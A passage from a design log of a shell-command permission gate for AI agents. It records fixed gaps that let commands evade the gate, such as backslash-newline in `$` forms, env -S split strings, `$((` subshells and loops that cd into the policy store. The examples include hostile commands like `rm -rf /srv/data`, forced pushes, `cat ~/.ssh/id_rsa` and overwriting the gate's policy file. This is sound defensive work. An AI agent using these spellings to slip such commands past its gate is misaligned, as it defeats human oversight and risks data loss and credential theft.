  167 s; a 1,000-deep chain of each shape now takes 0.2 to 4 s, against 0.1 to 0.3 s on main 58503282). A word of
  the command the gate cannot read asks too. An operand's tilde is read after brace expansion, as bash reads it
  (round 4: `sudo ~-{,}` is `sudo ~- ~-`).
  Chosen over rewriting the prefix reader: every part main made stays (the line's first part keeps sudo's raise and
  signal, and #454's sudo write still leads where main's `read` would), and the new parts only add. Added parts can
  still lower a line where they take the lead and a policy allows their category (`ssh host 'sudo -s < f'` was a
  costly internal `read` that logs, and `{opaque_exec: allow}` allowed the new lead), so the call is also read as
  before #491 (a mark in the call memo, then `_sudo_shell_off`), as the last of its floors: `readings` follows the
  chain of floors, and decide, `no_grant`, `call_approvers` and the hook take the strictest reading, so a decision
  is at least main's. The bare forms tighten: `sudo -s`, `sudo -i` and `sudo -s > /tmp/f` ask as `opaque_exec`
  where main allowed them as `read` or (#454) a costly `local_write`. An `always` on a fed line binds to the exact
  line, as for `echo 'rm -rf x' | bash`. Known limits, not filed here: `su` with no `-c` and `sudo su` with a stdin
  ask as an unknown program and the fed text is not read, so a deny on what it carries asks rather than denies; the
  files a login shell reads first and a `SHELL` that names another program are not read; an ambiguous long option
  is taken for a shell option when it may be one; `env -S 'sudo -s'` with a stdin asks as `env -S bash` does on
  main, and the fed text is not read; a reading where a word may take the next one as its value adds no ask for a
  program the gate cannot read there. The differential against main 58503282 (scripts/gate_diff.py,
  `--jobs 2`) lowers no pair: the built-in corpus without variants (12,258 actions x 88 policies) tightens 13,061
  pairs on 211 actions, and an aimed corpus of 8,316 lines (the new tests' lines, each shell spelling, feed, payload
  and wrapper, option words with an expansion or a glob, option values that may split, brace sets in values with
  repeated words, bracket-glob values, operands that may expand to an option, `~-` and `~+` with and without a
  brace, words that may take the next word as their value, list and validate modes, nested and long sudo chains,
  each pair of may and moved heads nested, and chains of them past the depth cap) under the 88 built-in policies
  and 37 more deny, category and reserved policies on `delete`, `force_push`, `web_post`, `store_write`,
  `credentials`, `opaque_exec` and `github_post` tightens 431,781 pairs on 5,166 actions.

  *Amendment 2026-10-26 (issue #584):* a backslash-newline inside a `$` form is joined before the form is read, as
  bash joins it. Outside single quotes bash drops each `\<newline>` before it expands a word, so
  `"$\<newline>(cmd)"` runs cmd, `"$\<newline>{x}"` is `"${x}"` and `"$\<newline>@"` splits as `"$@"`. The lexer
  read a `$` and then a backslash as a literal `$`, so `echo "$\<newline>(git push --force origin main)"` was an
  allowed `read` under `deny: [force_push]`, and `echo "$\<newline>(curl -X POST ...)"` an allowed `read` too.
  bash also drops them inside a `${..}` name and around its operator (`${PA\<newline>TH:=x}` sets PATH) and inside a
  `$((..))` body, which the lexer took as they stand. While `classify` reads a shell call, `classify_shell` notes
  (`_joining`) whether a line it reads, nested ones too, holds a `\<newline>` right after a `$`, in a `${..}` up to
  its first `}`, between `$(` and the `(` of `$((` or in a `$((..))` up to its close (`_join_dollars`). Only then
  is the call read a second time, with budgets of its own, with each such line joined before it is read, so
  `bash -c $'..'`, an `eval` or ssh argument in double quotes and a backquoted body (where `\\` is `\`) are joined
  at their own level once their word is decoded. The call then keeps both readings: the more severe
  (`_severity`) leads, so the approval card, the hook's block message and the ledger name it, and the other ends
  its `also` readings; on a tie, the line as read before leads. `gate.readings` walks every `also` and `floor`, so
  `decide`, `no_grant`, `call_approvers`, `body_unseen` and the hook read both and the stricter stands, and
  `binds_exact` binds an approval for such a line to its exact text. A line where nothing changed is read once, as
  before.

  The join is made in the text of each line `classify_shell` reads, chosen over a join in `_Lexer._dollar` and its
  twins (`_nest_end`, `_dollar_brace`) because one joined text keeps every offset the lexer and its readers share,
  and the line as written stays read by the lexer as it was. So it also joins in single quotes, a comment or a
  quoted here-document, where bash keeps the backslash-newline. There the joined text stays quoted or unread, and
  the line as written still decides: `: # $\<newline>(git push ...)` keeps main's deny (bash runs the next line),
  as does `echo "$\<newline>{x:-$(git push ...)}"`, whose joined form main reads only in part (#143). Limits: only
  shell calls are read again (not `execute_code`); text the gate reads without `classify_shell`, such as the folder
  walk of `cd` targets, is not joined; a joined form is read as the gate reads its plain form, so `$\<newline>[..]`
  is read as the `$[..]` it joins to, which #588's amendment reads as the arithmetic `$((..))` it stands for. A
   `${..}` is joined to its own `}`, past a `${..}` nested in it
  (`${a[${b}0,PA\<newline>TH=5]}`). #517 and #518 (here-document delimiters and backquoted bodies) are unchanged.

  The #423 differential against main 7785ffbb, each tree in its own process, `--jobs 2`: the built-in corpus with
  `--no-variants`, 9,355 actions under the 87 policies, lowers 0 pairs and tightens 4,646 pairs on 76 actions; an
  aimed corpus of 1,916 actions (74 new test lines, 373 backslash-bearing literals from the gate tests and 1,504
  generated lines: each `$` form with 0 to 3 `\<newline>`, in double quotes, unquoted, in `bash -c '..'` and
  `bash -c $'..'`, in `eval ".."`, in backquotes and in an ssh command, around a force push, a post, a delete and
  a read) under 99 policies (the 87 and deny, category and reserved entries on `force_push`, `web_post`, `delete`
  and `opaque_exec`) lowers 0 pairs and tightens 11,659 pairs on 200 actions; and the built-in corpus with its
  variants, 71,864 actions under the 87 policies, lowers 0 pairs and tightens 6,833 pairs on 112 actions,
  mostly `read allow` to the joined line's `opaque_exec`, `force_push`, `web_post`, `store_write`, `github_post` or
  `delete` ask, and `vcs_push log` to `force_push ask` (`git push $\<newline>'--force'`). No classify or decide
  errors.
  *Revisit if:* the lexer reads `\<newline>` inside every `$` form itself (#143's `${..}` rework), so one reading
  covers both.
  *Amendment 2026-10-26 (issue #515, revised after review):* The name parser adds camelCase words beside each separator part. The complete unsplit call is also
  read as a policy floor: its secret and store checks, target, posting text and category rules still apply.
  This prevents a new read hint from bypassing a store-source ask, an outbound hint from bypassing a
  credential ask, and a draft hint from weakening an existing send reading. A policy that asks or denies
  `unknown` still applies to a camelCase call previously read as unknown. `deleteFile` on `~/.exo`
  now asks through its new store-write reading; `readFile` on a store file still asks through the old
  store-source reading. Compact names such as `apiKey`, `checkOut` and `signUp` retain their old
  reading. Empty separator parts are dropped, preserving the MCP remote-write flag for leading separators.
  Earlier built-in differential counts covered the pre-review implementation only and do not validate
  these additional regressions. Regression tests cover secret/store floors, outbound metadata and posting
  rules, explicit unknown-category policies, and leading-separator MCP names.
  *Revisit if:* acronym boundaries need separate recognition (`HTTPDelete`, `getHTTPResponse`),
  or fully camel MCP prefixes need alignment (`mcpCreateFile`). The unsplit policy floor still applies.
  *Amended 2026-10-27 (review 5662071801, after #602 merged):* two exo-gate hook checks past `decide` still read
  the lead category alone, so the floor did not hold there on main e0968a2b: bypass ran a camelCase call whose
  `store_write` or `credentials` was in its floor reading (D-065 amendment of the same date), and the registry's
  high-risk ask (`risk: high`, `tool_risks`) skipped a camelCase MCP tool whose `unknown` was in its floor reading
  (`mcp__fs__writeFile`, `mcp__fs__readFile`, `mcp__fs__uploadFile`, `mcp__fs__moveFile`, `mcp__gh__listIssues`).
  That ask now fires when any reading (`gate.readings`) is `unknown`. In bypass it is lifted as any ask is, with a
  `decided_by: bypass` ledger row. Also recorded: a call with a `floor` binds an `always` answer and a standing
  grant to its exact arguments (`gate.binds_exact`), so every camelCase call (`getApiKey`, `execCommand`,
  `mcp__github__getIssue`, `mcpCreateFile`) does since #515, and a grant on `unknown` from before #515 no longer
  matches it. That only tightens.
- *Amendment 2026-10-26 (issue #591):* a leading assignment quoted whole in an `env -S` text no longer hides the
  command after it. GNU env splits the `-S` text into words and reads them as its own argv, so a word quoted whole
  with the form `NAME=value` is an assignment there too — `env -S "'X=a b' printenv X"` prints `a b` — but the
  gate read the text as one shell line, whose first word was an unknown program, so the command behind it was
  never read: `env -S "'X=a b' rm -rf /srv/data"` was `opaque_exec` and asked under `deny: [delete]`, where
  `env 'X=a b' rm -rf /srv/data` is `delete` and denies, and under `categories: {opaque_exec: allow}` it was
  allowed. The gate now reads the leading words of the split text as env's own argv, as env's own arguments
  already are: the first word that is neither an env option nor an assignment starts the command, and the text
  from it on is classified beside the shell line's reading, so the hidden command's category reaches the decision
  the way the spelling without `-S` does. This reading took a quoted `NAME=value` word after `--` for the command
  (corrected below: env still reads it as an assignment, `env -- prog= true` runs `true`), left a word with a
  shell operator in it to the line's own reading, and does not follow a split inside the split; an unknown
  program first is still the command and its arguments run nothing. The differential against main 3bf26afc
  (11438 actions, 88 policies) found nothing lowered, but it held no ssh-wrapped `-S` line: behind a hop the new
  part took the host from the `opaque_exec` part, which lowered (review 5665626829; the follow-up below fixes
  it). Tests: `tests/security/test_gate_category_deny_parts.py`.
- *Amendment 2026-10-27 (issue #591, follow-up to #634, review 5665626829):* an `env -S` text keeps the ssh hop's
  host and is split as env splits it. #634 added its parts to the call's one reading, and behind an ssh hop the
  host goes to the remote line's leading part, or on a secret or store line to #320's copy of its first targetless
  credentials or store part: the new delete, push, post or secret part took it, and the `opaque_exec` part the
  line had before was left with no target. Under `rules: [{match: {category: opaque_exec, target: host},
  decision: deny}]`, `ssh host 'env -S "'"'"'X=a b'"'"' cat ~/.ssh/id_rsa"'` went deny -> ask (below its plain
  `-S` spelling, which denies), so did the `rm -rf` form and `echo '...' | ssh host`, and `reserved:
  [tool:terminal]` lost `(opaque_exec, me@host)` on `ssh -p 22 me@host 'env -S ...'`. Now the call is read as a
  call of its own with each text a shell line only, as before #634, and, whenever any `env -S` text or spelling
  is read, with #634's reading of the leading words (`_env_split_argv`, unchanged), as main read it
  (`Classification.split_readings`; `_env_split_mode` tells each reading which). `readings` lists them, so
  `decide` keeps the strictest with every reserved hit and violation, and `no_grant`, `call_approvers`,
  `body_unseen`, the hook's body files and `binds_exact` read them too. Chosen over moving the host onto each
  targetless part (that would add targets main never gave, which an allow rule on the host could match) and over
  keeping the new parts out of the lead and the copy (a category line keyed on the old leading part still loses
  it): a reading of its own is the old reading exactly, with its own budgets. The call's first reading reads the
  line env runs (`_env_split_lines`, from the #591 branch): the words before the `-S` option, the text split by
  env's own rules (`_env_split`: quotes, backslash escapes, `\_`, `#` at a word's start, `\c`, `${NAME}`; `;`,
  `&`, `|` and `>` are characters of a word, so `'X=a b';x` is one assignment and `rm` runs) and the words after
  it, each quoted, read as `env NAME=VALUE cmd` is: after `--` a `NAME=value` word is still an assignment
  (coreutils: `env -- prog= true` runs `true`), so `env -S "-- 'X=a b' rm -rf /srv/data"` is a delete, which
  corrects the #591 amendment above. Every spelling GNU env 9.4 takes is found: `-S TEXT`, `-STEXT` read whole
  (`_strip_prefix_words` still cuts it at its first `=`, a reading kept beside: only `--split-string=` splits
  there), `--split-string=TEXT`, `--split-string TEXT` and each unambiguous prefix (`--split`, `--s`), and `-S`
  in a word of short options (`-iS`, `-vS`, `-i0vS`; one that takes a value, `-u` or `-C`, takes the rest). A
  shell expansion in the text keeps the words env closes before it, and the rest of the shell word stands for the
  rest, also split with each expansion a piece of its word (`$BR --force`). A text env would refuse adds no line,
  and a program from a variable stays opaque. A spelling main missed reads in the first reading as `-S TEXT`
  does (`_env_s_text`): its text a shell line beside the line env runs, with the `opaque_exec` part `-S`
  carries, and no environment dump read in its option word (main read `env --split-s="..."` as a dump). One more
  reading (mode 3) is the reading as before with every spelling so read, so the opaque part leads it as it leads
  the `-S` spelling's reading as before, and an ssh hop's host lands on it: under `categories: {opaque_exec:
  deny}` and the host rule, `env --split-s="..."` and `env -i0vS"..."`, bare and behind a hop, decide as `env -S
  "..."` does (they asked; review of this PR). The reading as before (mode 0) keeps main's dump and program
  parts. The exo-gate hook's bypass floor reads the category of the call and of each of these readings, as a
  line main read as credentials first (`env -S "'X=a b' gh auth token \d"`, `env -- -S "'X=a b' muse login"`)
  may lead with `opaque_exec` in the first reading now, and in bypass it went ask -> allow (review of this PR).
  Main's reading (mode 1) is taken whenever any `env -S` text or spelling is read, not only where #634's reading
  of the leading words finds a command in the first reading (verify 2 of this PR): that reading reads a spelling
  main missed as `-S TEXT`, so it never reached a nested text main read after the option word, and `env -iS'\q'
  sh -c 'env -S "'"'"'X=a b'"'"' rm -rf /srv/data"'` went deny -> ask under `deny: [delete]` and lost its
  `reserved: [delete]` hit, its `gh auth token` form went deny -> ask under `deny: [credentials]` and lost
  `no_grant`, and in bypass the hook allowed it where main asked at the floor (credentials, once); an aimed
  gate_diff of 156 such lines lowered 19,909 pairs on 2,037 actions at 1ae3b3a9, and lowers none now. classify
  puts main's reading first in `split_readings`, and in bypass the hook keeps main's order for it: the floor first
  when main's reading (or the call, with no split readings) is a floor category, then the hold of a post that
  breaks the posting rules, then the floor of any other reading, then allow. A floor check of every reading before
  the hold (round 1) turned a post main held into an ask at the floor (credentials, once) wherever a missed
  spelling's `-S TEXT` reading or mode 3 led with a secret or an environment dump: 65 of 1,694 hook lines (verify
  3 of this PR), such as `env -iS "gh auth token"; gh pr comment 5 --repo octo/demo --body "hello"`. They are held
  again, as on main, and `env -S "gh auth token"; gh pr comment ...` still asks at the floor. A hook probe of
  3,626 lines through `pre_tool_call` (bypass on, and ask mode) lowers none against main 58503282. The split is
  linear in the text, and a call with an `env -S` text costs up to four readings, each linear in the text with
  budgets of its own; nesting stops at `_DEPTH` as before. A spelling main missed that was one opaque word on main
  is read in full now. Measured in CPU time (best of three) against main 58503282: `env -S "'X=a b' rm -rf
  /srv/data"` takes 6 ms (main 3 ms), the nested `env -iS'\q' sh -c '...'` row 7 ms (main 4 ms), `env
  --split="..."` with a 40 KB text of 20,000 words 3.7-4.4 s (main 0.06 s; 1.0 s at 10 KB, so linear) and with one
  40 KB word 0.5 s (main 0.06 s), and the aimed gate_diff below took 1,910 s on this branch against 544 s on main.
  No memo is shared across the readings (each keeps its own budgets); a size cap or such a memo is left for a
  follow-up. A spelling main missed is not read with #634's leading words (mode 1 is main's reading exactly), so
  where env refuses its text (`env --split "'X=a b' gh auth token \d"`) it can ask where the `-S` spelling denies;
  env runs nothing then, and main asked or allowed that line too. A text nested behind such a spelling that main
  read (`env -iS'\q' sh -c 'env -S "..."'`, which main denied under `deny: [delete]`) is read as main read it, in
  mode 1, and decides as on main.
  Measured on main e0968a2b, under `deny: [delete]` each of `env --split`, `--split-str`, `-iS`, `-vS`, `-i0vS`
  with `"'X=a b' rm -rf /srv/data"`, `env -S'"X=a b" rm -rf /srv/data'`, `env -iS "rm -rf /srv/data"`, the `--`
  row and `env -S "'X=a b';x rm -rf /srv/data"` asked and now denies; under `categories: {opaque_exec: allow}`
  the `--split`, `-iS`, `-vS` and glued `;x` rows were allowed and now ask; under `categories: {opaque_exec:
  deny}` the `-i0vS"..."`, `--split=` and `--split-s=` rows asked and now deny (the same on main 58503282).
  Nothing lowers: gate_diff (main's script, `--jobs 2`) against main 58503282 lowers 0 of 1,066,296 pairs on the
  built-in corpus without variants (12,117 actions x 88 policies, 381 tightened) and 0 of 3,747,240 on an aimed
  corpus of 20,818 `env -S` lines without variants (round 1's 18,270: 28 spellings, 12 assignment prefixes, 10
  payloads among them an unknown escape and an unclosed quote, both quotings, bare and behind sudo, doas, nice
  and timeout, and 16 spellings behind six ssh, mosh and stdin-fed ssh forms; verify 2's 156 nested
  missed-spelling lines; and 2,392 more: 20 spellings before `sh -c` and `bash -c` with seven nested `env -S`
  payloads, bare, behind sudo, doas, nice and timeout and behind four ssh, mosh and stdin-fed ssh forms, and
  the bypass hold row) under 180 policies (the built-in ones and 92 more: deny and allow rules on the host and
  `me@host`, category lines, deny and reserved entries on ten categories and on the host, `forbid_words`;
  98,066 pairs tightened on 12,439 actions). Verify 2's 156 lines with their variants (2,912 actions x 93
  policies) lower 19,909 pairs on 2,037 actions at 1ae3b3a9 and 0 now, and its 5,000 random `env -S` lines with
  their variants (49,659 actions x 97 policies) lower 0. Known limits, as without `-S` (review nits, not
  touched): a NAME env takes that is not an identifier (`a.b=1`), a lone `-`, and the value of an option word
  that takes one (`env -iu HOME`) read as the program, an unknown program that `categories: {opaque_exec: allow}`
  allows. Tests:
  `tests/security/test_gate_env_split_string.py`, `tests/security/test_gate_category_deny_parts.py`,
  `plugins/exo-gate/tests/test_bypass.py`.
- *Amendment 2026-10-26 (issue #585):* the lexer reads the `$` form after a `\<newline>` itself now, as bash reads
  it. #584 read such a line joined beside itself, but the line as written still read a `$` and then a backslash as
  a literal `$`, so its words were plain text and the decision leaned on the joined reading alone.
  `_Lexer._dollar` (which `_dquote`'s `$` path calls, so double-quoted forms too) skips each `\<newline>` after
  the `$` before it reads the next character: the substitutions, `$@`, `${..}`, `$'..'`, `$".."` and plain names.
  `_dollar_brace` skips them before the `{` and blanks them in its visible text, and a `${..}` the `\<newline>`
  splits still has the `$( )` and backticks inside it classified, as the word-walk it replaced did.
  `_nest_end`'s twin skips them too, so the two readers still end together. `_hash_rebind`'s `lone()` tests
  `"${!"` on the word with the `\<newline>`s dropped, as `glob()` and `tilde()` already do, so
  `hash -p "${\<newline>!n}"` asks as `hash -p "${!n}"` does, while `hash "$cmd"`, `hash -p "$P"`, `hash "$r"`
  through a nameref (bash prints `"${r}"` of `r='a[@]'` as one word) and a `\\<newline>` after a `$` (an escaped
  backslash, not a continuation of the form) stay `read`. Each line of the issue decides as its plain spelling
  does: the hash rows opaque (`hash "$\<newline>@"; ls`, `hash -p "$\<newline>@"; ls`,
  `hash "$\<newline>{!n}"; ls`, `hash $\<newline>O /tmp/x ls; ls`, `hash -p $\<newline>P; ls`), the POST row
  `web_post` and the plain push row `vcs_push`.
  The #423 differential against main c6b24779 (11564 actions, 88 policies) lowers 9 pairs in two groups, each the
  misparse's artifact going away, each deciding as its plain spelling does on main. `matrix_ask_log_then_allow`
  (6 pairs): `echo $\<newline>(git push --force origin main)`, its doubled `\<newline>` and `x=$(..)` forms — the
  misparse split the line into `echo $` and a subshell, so the `allow git` rule could not name the echo command's
  own text (#394); the plain spelling `echo "$(git push --force origin main)"` allows on main.
  `reserved_tool_terminal` (3 pairs): `git push $\<newline>'--force' origin main` and the ssh forms — the ask
  stands; the dropped second reserved hit was the misparse's phantom `$--force` push target, which bash does not
  read (the quoted `'--force'` is the flag). Tests: `tests/security/test_gate_dollar_line_continuation.py`.
  *Revisit if:* a `${..}` the `\<newline>` splits should read its operator in the line as written too — the
  scan's visible text blanks the `{`, so `_hidden_sets` sees an assignment in it only on the joined reading,
  which still decides the line.
  *Amendment 2026-10-26 (issue #588):* bash's legacy arithmetic `$[expr]`, which bash still accepts, is read as the
  `$((expr))` it stands for, so the assignment check, a nested `$( )` and the quoting of that reading apply to it.
  The lexer read `$[..]` as plain text, so an assignment in it went unseen where the same line written with
  `$((..))` asked (#341/#409): `echo $[PATH=5]; ls` and `echo "$[PATH=5]"; ls` were allowed `read`s, and so were
  `echo $[BASH_ENV=5]; ls` and `echo $[a[PATH=5]]; ls`, a subscript whose evaluation assigns. The word keeps `$[..]`
  as written, so its readings beside the arithmetic one are as they were. An element the body sets is read too
  (`echo $[BASH_CMDS[ls]=1]; ls` rebinds a program name, as `hash -p` does), also through `$((..))`, where main
  allowed it. The `${..}` word reading takes the legacy body through the expansion it is in
  (`echo ${a:-$[PATH=5]}; ls` asks), as its `$((..))` spelling does. The #584 join of `$\<newline>[..]` lands on
  this reading, so the joined line decides as its plain one. A `$[..]` in a write's target keeps main's
  `local_write` of the path as written beside the dynamic reading, so a deny on the write still reaches the line.
  The #588 differential against main d800f33c, each tree in its own process, `--jobs 4`: the built-in corpus with
  `--no-variants`, 11,470 actions under the 88 policies, lowers 0 pairs and tightens 2,016 pairs on 28 actions,
  mostly `read allow` to the arithmetic's `opaque_exec ask`. No classify or decide errors.
  *Revisit if:* the card for an element set in arithmetic names the array (`BASH_CMDS`), not the element's key.
  *Amendment 2026-10-26 (issue #553):* a `$((` bash reads as a command substitution is read as one. bash closes the
  `$( ` at the first `)` outside quotes, backquotes, `$( )` bodies and comments, and reads the span as arithmetic
  only when the text between the parens, quoted spans skipped, holds balanced parens (its chk_arithsub); else it
  re-reads the span as `$( ( )`, a subshell, and the commands in it run. The gate matched `$((` against `))` without
  counting quotes, so a `((` in a quoted word made it read the whole span as arithmetic text and it never read the
  commands: `echo $((echo '((' ; git push --force origin main) )` was an allowed `read` under `deny: [force_push]`,
  where the same line written `echo $( (echo '((' ; git push --force origin main) )` denied, and so were the
  double-quoted and `$'..'` forms, a hidden `git push origin :main` or `rm -rf x` in the same shape (both deny under
  `deny: [delete]`), and `echo $(( 1 + '(' )); git push --force origin main`, where a quoted paren made the span run
  to the end of the line, so the push after `;` was never read — bash discards the rest of its line after that
  arithmetic error, but runs it on the next line, in a script, and other shells may run it on the same line. The
  gate now finds the `))` with quotes and nesting counted, applies the paren balance to what is between the parens,
  reads a span that fails either as the `$( ( )` it runs as, and reads the arithmetic span only as far as bash
  extracts it, so what follows is read when bash's line would end. An unclosed `$((` bash cannot parse and runs
  nothing, and the span stays arithmetic text to the end of the line, as before, so the deep-nest readings stay
  linear. Plain arithmetic decides as it did (`$((1+2))`, `$((PATH=5))`, `$[PATH=5]`, a ternary, a `$( )` or a
  backquote inside the body, a `$((echo hi) )` subshell), and `_nest_end` ends a cut at the same span.
  The #553 differential against main fa5dfcd8, each tree in its own process, `--jobs 4`: the built-in corpus with
  `--no-variants`, 11,855 actions under the 88 policies, lowers 0 pairs and tightens 1,290 pairs on 18 actions,
  mostly `read allow` to the hidden commands' asks and denies (932 to `force_push ask`, 258 to `delete ask`, 42 to
  `force_push deny`, 18 to `delete deny`). Of the corpus's 69 `$((` rows, 3 decide differently: the issue's own two
  shapes and `echo $((echo hi) ; git push --force origin main )`. No classify or decide errors.
  Tests: `tests/security/test_gate_dollar_paren_cmdsub.py`.
  *Revisit if:* a `${x:-$((cmd))}` should read the commands in its default word — a `$((` inside a `${..}` body is
  still read as the brace's visible text, as the same line with a plain `$( )` there is (both were `allow` on main
  and stay so), which is the `${..}` default word's own gap, not this one.
- *Amendment 2026-10-28 (issue #479, also #480):* a loop body that `cd`s into the store runs its earlier commands
  there on its next pass, and the gate reads them so now. The gate read a line's commands once, in order, and a
  command counted as in the store only after the `cd` that entered it (#465 seeds substitutions the same way), so
  `for i in 1 2; do cp /tmp/evil gates.yaml; cd ~/.exo/policies; done` and its `while :` and `until false` forms,
  where the `cp` rewrites the policy file on the second pass, were allowed reads on main cd371aed, also under
  `deny: [store_write]`; the `select` row and `while :; do echo $(cp /tmp/evil gates.yaml); cd ~/.exo/policies;
  done` asked there, but did not deny; so it still was on main f28934a3. Now, when a `for`, `select`, `while` or
  `until` body (a `coproc` one too) holds a `cd` or `pushd` into the store or a descriptor folder after the loop's
  first command (nested loops, the loop's condition, a nested line and the forms the `cd` check reads included:
  `"$HOME/.exo/policies"`, `$EXO_HOME/policies`, `${X:-~/.exo/policies}`, `~/.exo/pol*`, `/dev`, `/dev/fd`),
  `classify` reads the call a second time. A `for` or `select` loop whose body is a `{ ..; }` group (`for i in 1 2;
  { ..; }`, `for i; { ..; }`, `select x in a b; { ..; }`, `for ((i=0;i<2;i++)) { ..; }`, also after `;` or a
  newline) counts as one with a `do ..; done` body (verify of #479): bash runs the group once per pass in the same
  shell, but `_parse` opens no loop there, so `_brace_head` finds the header just before the group, and a group
  that is no loop's body (one after a `done`, a plain `{ ..; }`, an arithmetic command's `(( i++ )); { ..; }`)
  runs once and is not read again. For `for ((..))`, `_parse` itself marks the `{` that follows the header's
  closing `))`, a `;` or newline between (`_Cmd.arith_for`, second verify of #479): it counts the `(` and `)`
  tokens apart from the compounds, so whatever the arithmetic holds is skipped. The first verify's search back
  from the group stopped at a piece that starts with a reserved word and looked back 16 commands, but in `(( ))`
  a reserved word is a plain variable name (`for ((do=0; do<2; do++)) { ..; }`, `while`, `done`, `if`) and each
  `|` or `&&` there is a command of its own to `_parse`, so those headers and one of more than 15 pieces were
  missed (asked as `opaque_exec`, auto-allowed under bypass, as on main) and now deny under `deny:
  [store_write]` as the do/done form does. On main f28934a3 `for i in 1 2; { cp /tmp/evil gates.yaml; cd
  ~/.exo/policies; }` was an allowed read under every policy, auto-allowed by the hook in every mode, and the
  `select` and `for ((..))` forms asked as `opaque_exec` without a `deny: [store_write]` deny. On the second
  reading `_classify_shell` reads the line again in its order (`_loop_again`), with the folder entered where the
  outermost such loop starts, named by that loop's first descriptor `cd` (fd_cwd, #217), and adds the parts of the
  loop's commands and substitutions that the line does not already have. A line already read in a store folder
  (a `$( )` after the `cd`) read every command there, so it is not read again unless a loop names a descriptor
  folder the line was not read in. bash expands a `for` or `select` word list and the redirections of the loop's
  `done` (or `}`) once, before the first pass, so those keep their folder, and so does a command before the loop.
  A later `cd` out in the body (`cd -`, `cd /tmp`) is not followed: fails closed, as a subshell `cd` does; a `cd -`
  that goes back into the store on a later pass is covered by the same reading. The second reading is kept beside
  the first as #584's joined reading is (`_beside`): the more severe leads, the other ends its `also` readings, and
  `decide`, `no_grant`,
  `call_approvers` and the exo-gate hook read each (`gate.readings`), so the issue's rows are `store_write`, ask
  the principal alone, are never granted, keep the D-065 bypass floor and deny under `deny: [store_write]`. The
  first reading is main's reading of the call, unchanged, so no line decides lower; a line with no such loop is
  read once, as before, and when the second reading adds no part it is dropped. When the second reading leads it
  takes the first's D-074 `ordinary` reading if it has none of its own. `classify_shell` alone still reads a line
  once. The second reading has a budget (`_LOOP_BUDGET`, verify of #479): it may read afresh (each line, `$( )`
  body and nested line `classify_shell` has not read in the same state) 64 lines more than the first reading did.
  A nest of loops in `$( )`, each with a `cd` into the store, reads each body in two folders on every level, and
  the memo keys a line by the budgets left too, so the verifier measured it at about 6 times main's time from 5 to
  13 levels deep (main 7.6 s, branch 48.5 s at 12 levels, under load). Past the budget the second reading stops
  (`_LoopBudget`) and one `store_write` part with no own text stands for the passes it did not read: it asks the
  principal alone, no grant covers it, the bypass floor holds and `deny: [store_write]` denies it, beside main's
  reading, which stays as it was. Measured CPU time (`time.process_time`, the best of three runs, main f28934a3 vs
  this branch, load average 10 to 29 on 4 CPUs): the issue's row 5 ms to 19 ms; that nest 5 levels deep 0.09 s to
  0.30 s, 8 levels 0.39 s to 1.05 s, 12 levels 2.97 s to 6.25 s (past the budget from 5 levels); the brace form 8
  levels deep 0.53 s to 1.23 s; 200 nested `for` loops 0.09 s to 0.24 s; 1,500 such loops side by side on one line
  2.24 s to 6.55 s (each loop's commands are read once more, linear in the line; the second reading adds no part
  there and is dropped, since the first loop's `cd` already puts the rest in the store); a `for ((..)) { ..; }`
  header with 200 `|` pieces 0.02 s to 0.07 s. The budget bounds each classify, and a call whose Exo-home
  `config.json` counts as the store has a D-074 `ordinary` reading that is a classify of its own, with its own
  second reading and budget, so both readings pay the multiplier: the nest six levels deep with a `cp` into
  `~/.exo/config.json` took 1.10 s against 0.29 s on main (about 4 times, second verify; letting that reading share
  the outer budget was left out, as it is bounded). Known limits: a `cd` through a variable set earlier or through
  the loop variable (`d=~/.exo/policies; for i in 1 2; do cp /tmp/evil gates.yaml; cd $d; done`, `for d in /tmp
  ~/.exo/policies; do ..; cd $d; done`) is not followed, as on a line without a loop, since the `cd` check reads no
  variable's value where it is set (the verifier's low finding, kept as a limit); a function the loop calls is not
  followed into, though its call is then a command in the store and asks; a loop behind `time` (`time for ..`) is
  not a compound to `_parse`, as on main, so it has no second reading: it asks as `opaque_exec` without a `deny:
  [store_write]` deny, a seat the approvers name may answer it, and under permissions bypass the exo-gate hook
  auto-allows it, all as on main f28934a3. The #479 differential against main f28934a3 (main's
  `scripts/gate_diff.py`, each tree in its own process, `--jobs 2 --timeout 0`): the built-in corpus with
  `--no-variants`, 12,763 actions under the 88 policies (1,123,144 pairs), lowers 0 pairs and tightens 7,129 pairs
  on 122 actions, mostly `read allow` to `store_write ask` (6,120), `local_write allow` to `store_write ask` (302),
  `read allow` to `store_write deny` (160), `shell allow` to `store_write ask` (157) and `opaque_exec allow` to
  `opaque_exec ask` (130); 377 pairs keep their outcome with another detail. An aimed corpus of 11,424 loop lines
  (`--only-corpus`, 22,848 actions with their shell-tool forms: 9 bodies, a write before or after the `cd`, 11
  folders (the store spelt six ways, `/dev`, `/dev/fd`, two plain folders and `$d`), `cd`, `pushd` and a `cd` then
  `cd -`, 16 loop forms (`do ..; done` and `{ ..; }` bodies, `for x;`, `for ((..))` with and without `;`,
  `select`, `while`, `until`, `coproc`, nested, behind `time`, a word list's `$( )`) and 6 wrappers (`bash -c`,
  `$( )`, a pipe, `if`, a write before, a closer's redirection)) under the 88 policies and 105 more (deny,
  reserved, category, rule, command-rule, target and matrix entries on ten categories; 193 in all, 4,409,664 pairs)
  lowered 0 pairs and tightened 606,376 pairs on 7,792 actions before the second verify, mostly `read allow`
  (300,979), `local_write allow` (183,467) and `shell allow` (24,636) to `store_write ask`. The second verify's
  `_parse` change can only touch a line with a `for ((`, so the aimed run was repeated on every line of that corpus
  and of 4,950 new ones that holds a `((` (7,092 lines, 14,184 actions: the earlier `for ((..))` forms, a reserved
  word as the variable, a `!`, 20 `|`, `&&` or `||` pieces, a newline or comment before the body, a subshell, a
  nested `do` loop, and the guards `(( i++ )); { ..; }`, a group after a `for ((;;)) { :; }` and after a `do ..;
  done`) under the same 193 policies (2,737,512 pairs): 0 lowered, 135,509 tightened on 4,752 actions, mostly
  `read allow` to `store_write ask` (32,301), `opaque_exec allow` to `opaque_exec ask` (23,940) and `opaque_exec
  ask` to `opaque_exec deny` (21,402); 19,783 pairs keep their outcome with another detail. Every line of the new
  corpus (16,374) with no `cd` into a store folder (4,806 lines: the plain folders `/tmp/proj` and `../src` and the
  variable `$d`, and the guards) keeps main's number of readings, category and decisions (default and `deny:
  [store_write]`) exactly. No classify or decide errors. Tests: `tests/security/test_gate_loop_cd_store_479.py`
  (97 of its 157 tests fail on main f28934a3; one of them, the cost test, only because main has no
  `_loop_reading` to patch).
  *Revisit if:* the gate learns a variable's value where it is set: a `cd $d` into the store in a loop then needs
  no other change.
